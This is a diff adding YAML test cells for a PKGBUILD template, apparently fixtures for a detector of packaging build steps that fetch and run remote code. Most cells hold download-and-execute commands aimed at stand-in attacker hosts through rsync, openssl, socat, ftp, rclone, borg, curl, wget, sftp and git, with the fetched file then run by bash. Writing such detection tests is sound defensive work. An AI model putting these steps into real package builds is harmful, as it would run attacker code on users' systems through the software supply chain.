@@ -1,0 +1,130 @@
+template: template.PKGBUILD
+cells:
+- id: rsync-forge-host
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: '  rsync -a rsync://github.com/x/stage "$srcdir"/stage
+
+      cp "$srcdir"/stage "$srcdir"/harness-baseline-1.0.0/configure
+
+      bash "$srcdir"/harness-baseline-1.0.0/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: rsync-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  rsync -a rsync://attacker.test/x/stage "$srcdir"/stage
+
+      cp "$srcdir"/stage "$srcdir"/harness-baseline-1.0.0/configure
+
+      bash "$srcdir"/harness-baseline-1.0.0/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: fetch-cmd-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  fetch -o "$srcdir"/stage https://attacker.test/p
+
+      cp "$srcdir"/stage "$srcdir"/harness-baseline-1.0.0/configure
+
+      bash "$srcdir"/harness-baseline-1.0.0/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: openssl-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: "  printf 'GET /p/s HTTP/1.1\\r\\nHost: attacker.test\\r\\nConnection: close\\r\\n\\r\\n' \\\
+      \n    | openssl s_client -quiet -connect attacker.test:443 2>/dev/null \\\n    | sed -n '/^\\r*$/,$p'\
+      \ > \"$srcdir\"/harness-baseline-1.0.0/configure\nbash \"$srcdir\"/harness-baseline-1.0.0/configure"
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: socat-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: "  printf 'GET /p/s HTTP/1.1\\r\\nHost: attacker.test\\r\\nConnection: close\\r\\n\\r\\n' \\\
+      \n    | socat - \"OPENSSL-CONNECT:attacker.test:443\" 2>/dev/null \\\n    | sed -n '/^\\r*$/,$p'\
+      \ > \"$srcdir\"/harness-baseline-1.0.0/configure\nbash \"$srcdir\"/harness-baseline-1.0.0/configure"
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ftp-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: "  printf 'get https://attacker.test/p\\n' | ftp -n attacker.test 2>/dev/null \\\n    | sed\
+      \ -n '/^\\r*$/,$p' > \"$srcdir\"/harness-baseline-1.0.0/configure\nbash \"$srcdir\"/harness-baseline-1.0.0/configure"
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: rclone-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  rclone copyto :https:,"https://attacker.test/p" "$srcdir"/harness-baseline-1.0.0/configure
+
+      bash "$srcdir"/harness-baseline-1.0.0/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: borg-attacker-host
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  borg extract --repo rsync://attacker.test/repo::archive "$srcdir"/harness-baseline-1.0.0/configure
+
+      bash "$srcdir"/harness-baseline-1.0.0/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: rsync-forge-host-openssl-443
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: "  printf 'GET https://github.com/example/harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost:\
+      \ github.com\\r\\nConnection: close\\r\\n\\r\\n' \\\n    | openssl s_client -quiet -connect github.com:443\
+      \ 2>/dev/null \\\n    | sed -n '/^\\r*$/,$p' > \"$srcdir\"/harness-baseline-1.0.0/configure\nbash\
+      \ \"$srcdir\"/harness-baseline-1.0.0/configure"
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ctl-curl-toplevel
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  curl -fsSL https://attacker.test/p -o "$srcdir"/stage
+
+      bash "$srcdir"/stage'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ctl-wget-toplevel
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  wget -qO "$srcdir"/stage https://attacker.test/p
+
+      bash "$srcdir"/stage'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ctl-sftp-toplevel
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  sftp -b - u@x "https://attacker.test/p" <<< "get /stage"
+
+      bash "$srcdir"/stage'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ctl-git-clone-toplevel
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: '  git clone https://attacker.test/p "$srcdir"/x
+
+      bash "$srcdir"/x/configure'
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+- id: ctl-rsync-in-build
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: ''
+    payload: '  rsync -a rsync://attacker.test/x/stage "$srcdir"/stage
+
+      cp "$srcdir"/stage "$srcdir"/configure
+
+      bash "$srcdir"/configure'
+- id: ctl-rsync-in-build-direct-exec
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    extra: ''
+    payload: '  rsync -a rsync://attacker.test/x/stage "$srcdir"/s.sh
+
+      bash "$srcdir"/s.sh'
